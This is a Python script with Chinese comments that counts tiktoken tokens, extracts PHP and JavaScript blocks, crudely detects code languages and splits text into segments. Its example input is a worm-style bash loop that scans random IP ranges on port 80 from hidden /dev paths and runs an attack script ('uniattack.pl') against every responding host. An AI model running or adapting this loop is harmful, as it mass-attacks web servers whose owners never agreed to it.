import re
import tiktoken

# 定义 PHP 代码块识别的正则表达式模式
php_pattern = r'<\?php[\s\S]*?\?>'

# 定义 JavaScript 代码块识别的正则表达式模式
javascript_pattern = r'<script\b[^>]*>([\s\S]*?)<\/script>'

# 定义每段的最大 token 数
max_segment_length = 200


def calculate_token_count(text, encoding_name):
    # 使用 OpenAI 的 `tiktoken` 包计算文本的 token 数
    # token_count = openai.api_calls.get_usage()["usage"]["total_tokens"]
    """Returns the number of tokens in a text string."""
    encoding = tiktoken.get_encoding(encoding_name)
    num_tokens = len(encoding.encode(text))
    return num_tokens


def extract_code_blocks(text):
    # 识别并提取 PHP 代码块
    php_code_blocks = re.findall(php_pattern, text)

    # 识别并提取 JavaScript 代码块
    javascript_code_blocks = re.findall(javascript_pattern, text)

    return php_code_blocks, javascript_code_blocks

# 可用度并不理想
def detect_code_language(text):
    # 检测文本中是否存在Python代码
    python_pattern = r'(?s)\b(?:import|from)\s+\S+\s+(?:import|as)\s+\S+|def\s+\w+\s*\(.*?\)\s*:'
    python_match = re.search(python_pattern, text)
    if python_match:
        print("Python代码检测到：")
        print(python_match.group())

    # 检测文本中是否存在Bash脚本
    bash_pattern = r'\b(?:bash|sh|shell)\s+\S+'
    bash_match = re.search(bash_pattern, text)
    if bash_match:
        print("Bash脚本检测到：")
        print(bash_match.group())

    # 检测文本中是否存在SQL语句
    sql_pattern = r'\b(?:SELECT|INSERT|UPDATE|DELETE)\b'
    sql_match = re.search(sql_pattern, text, re.IGNORECASE)
    if sql_match:
        print("SQL语句检测到：")
        print(sql_match.group())

def split_text_into_segments(text, encoding_name):
    encoding = tiktoken.get_encoding(encoding_name)
    tokens = encoding.encode(text)

    # 切分成段落，每段不超过 max_segment_length 个 token
    segments = []
    current_segment = []
    token_count = 0
    segment_count = 0
    for token in tokens:
        token_count += 1
        # token in ['.', '!', '?'] and token_count > max_segment_length
        if token_count > max_segment_length:
            if segment_count == 0:
                segments = [current_segment]
            else:
                segments.append(current_segment)
            segment_count += 1
            current_segment = [token]
            token_count = 0
        else:
            current_segment.append(token)
    if token_count <= max_segment_length:
        if segment_count == 0:
            segments = [current_segment]
        else:
            segments.append(current_segment)

    return segments


# 示例用法
input_text = '''while true \ndo\ni=`/usr/local/bin/perl /dev/cuc/ranip.pl`\nj=0\nwhile [ $j -lt 256 
];do\n/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.51 -b 
$i.$j.100 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 80 >> 
/dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a 
$i.$j.201 -b $i.$j.254 80 >> /dev/cub/$i.txt\nj=`/bin/echo \"$j+1\"|/bin/bc`\ndone\niplist=`/bin/awk -F: '{print $1}' 
/dev/cub/$i.txt`\nfor ip in $iplist;do\n/usr/local/bin/perl /dev/cuc/uniattack.pl $ip:80 >> 
/dev/cub/result.txt\ndone\nrm -f /dev/cub/$i.txt '''

encoding_name = "cl100k_base"
# encooding_name = "gpt-3.5-turbo"


# 1. 计算文本的 token 数
token_count = calculate_token_count(input_text, encoding_name)
print("Token count:", token_count)

# 2.1 检测输入类型：
detect_code_language(input_text)

# 2.2 提取 PHP 和 JavaScript 代码段
php_blocks, javascript_blocks = extract_code_blocks(input_text)
print("PHP code blocks:", php_blocks)
print("JavaScript code blocks:", javascript_blocks)

# 3. 将非代码段内容切分成段落
non_code_segments = split_text_into_segments(input_text, encoding_name)
encoding = tiktoken.get_encoding(encoding_name)
print("Other-code segments:")

for segment in non_code_segments:
    text = encoding.decode(segment)
    print(text)

